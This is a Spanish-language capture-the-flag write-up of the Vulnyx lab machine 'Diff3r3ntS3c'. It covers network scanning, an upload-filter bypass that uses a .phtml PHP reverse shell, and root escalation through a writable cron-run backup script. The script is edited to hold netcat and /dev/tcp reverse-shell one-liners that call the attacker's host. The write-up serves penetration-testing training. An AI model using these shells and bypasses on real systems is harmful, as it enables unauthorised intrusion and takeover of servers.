# Diff3r3ntS3c

Plataforma: Vulnyx
OS: Linux
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 30 de abril de 2025 23:53
IP: 192.168.0.236

## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Identificamos los dispositivos de la red mediante arp-scan

```bash
sudo arp-scan -I eth0 --localnet                                                                                           1 ✘  23:59:00  
Interface: eth0, type: EN10MB, 
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)

192.168.0.236	08:00:27:29:77:d1	PCS Systemtechnik GmbH

```

Localizamos la maquina víctima por el identificador de la MAC, que al empezar por 08:00 nos indica que pertenece al proveedor VirtualBox

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.236 -oG targeted

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:29:77:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p80 -sCV 192.168.0.236 -oN targted
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Diff3r3ntS3c
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:29:77:D1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

- **Identificación de vulnerabilidades**
    - 80 Apache httpd 2.4.57

Enumeramos el servidor web

Miramos mediante whatweb o wapalizer que tecnologias usa la web

```bash
whatweb http:\\192.168.0.236
http://192.168.0.236 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168.0.236], JQuery, Script, Title[Diff3r3ntS3c]

```

Revisamos el sitio web y vemos un apartado en donde se pueden subir ficheros

![image.png](./imagenes/Diff3r3ntS3c_image.png)

Antes de seguir este vector de ataque, investigamos mediante fuzzing si hay directorios donde subir los ficheros

```bash
dirb http:\\192.168.0.236
==> DIRECTORY: http://192.168.0.236/uploads/  
```

Una vez hemos encontrado el directorio uploads, procedemos a tratar de subir una revershell para entablar conexión con la maquina victima

Usaremos la webshell ubicada en :

```bash
 cp /usr/share/webshells/php/php-reverse-shell.php ../content/shell.php  

```

![image.png](./imagenes/Diff3r3ntS3c_image 1.png)

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### ReverShell

```bash

```

Al tratar de subir la revershell obtenemos el mensaje siguiente :

```bash
http://192.168.0.236/uploadData.php
This file looks malicious. Please do not try to hack us.
```

Vamos a probar de bypassear el control de contenido. Cambiamos la extensión del archivo y obtenemos el mensaje:

```bash
cp shell.php6 shell.phtml 
The file shell.php.doc has been uploaded
```

Accedemos al enlace de descargas que hemos localizado anteriormente y obtenemos la revershell

```bash

nc -lvnp 4444
http:\\192.168.0.236\uploads\1\shell.phtml

listening on [any] 4444 ...
connect to [192.168.0.115] from (UNKNOWN) [192.168.0.236] 52048
Linux Diff3r3ntS3c 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64 GNU/Linux
 00:26:09 up 30 min,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Hacemos tratamiento de la TTY

```bash
$ script -c bash /dev/null
candidate@Diff3r3ntS3c:/$ 
ctr+z
stty raw echo; fg
reset xterm
candidate@Diff3r3ntS3c:/$ 
candidate@Diff3r3ntS3c:/home/candidate$ cat user.txt 
9b*********************e8d
candidate@Diff3r3ntS3c:/home/candidate$ 
```

### Escalada de privilegios

Vamos a tratar de escalar privilegios desde el usuario candidate hasta root.

Probamos a listar permisos mediante sudo y ficheros con capacidad de escritura , y encontramos un archivo interesante

```bash
candidate@Diff3r3ntS3c:/home/candidate$ sudo -l
bash: sudo: command not found

candidate@Diff3r3ntS3c:/home/candidate$ find / -type f -perm -u=w 2>/dev/null
/home/candidate/.scripts/makeBackup.sh
candidate@Diff3r3ntS3c:/home/candidate$ cat makeBackup.sh 

#!/bin/bash

# Source folder to be backed up
source_folder="/var/www/html/uploads/"

# Destination folder for the backup
backup_folder="/home/candidate/.backups/"

# Create backup folder if it doesn't exist
mkdir -p "$backup_folder"

# Backup file name
backup_file="${backup_folder}backup.tar.gz"

# Create a compressed tar archive of the source folder
tar -czf "$backup_file" -C "$source_folder" .

candidate@Diff3r3ntS3c:/home/candidate/.scripts$ 

```

Vemos que se trata de un script para realizar un backup del contenido de la carpeta uploads.

Buscamos donde se puede estar usando este script y vemos se usa en una tarea programada (cron)

```bash
candidate@Diff3r3ntS3c:/home/candidate/.scripts$ grep -rl "makeBackup.sh" /etc /home /opt /var /usr /root 2>/dev/null
/etc/crontab

candidate@Diff3r3ntS3c:/home/candidate/.scripts$ cat /etc/cron*
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
* * * * * root /bin/sh /home/candidate/.scripts/makeBackup.sh
```

Como tenemos permisos para editar el fichero, cambiamos el contenido para que nos ejecute una shell con permisos de root

```bash
candidate@Diff3r3ntS3c:/home/candidate/.scripts$ nano makeBackup.sh
nc 192.168.0.115 4433 -e /bin/bash  
# alternativa si no esta disponible nc
/bin/bash -i >& /dev/tcp/192.168.0.115/4433 0>&1

nc -lvnp 4433                                                                                                               ✔  01:09:51  
listening on [any] 4433 ...
connect to [192.168.0.115] from (UNKNOWN) [192.168.0.236] 50606
whoami
root
script -c bash /dev/null
Script iniciado, el fichero de anotación de salida es '/dev/null'.
root@Diff3r3ntS3c:~# 
root@Diff3r3ntS3c:~# cat root.txt
cat root.txt
2********************da
root@Diff3r3ntS3c:~# 

```

##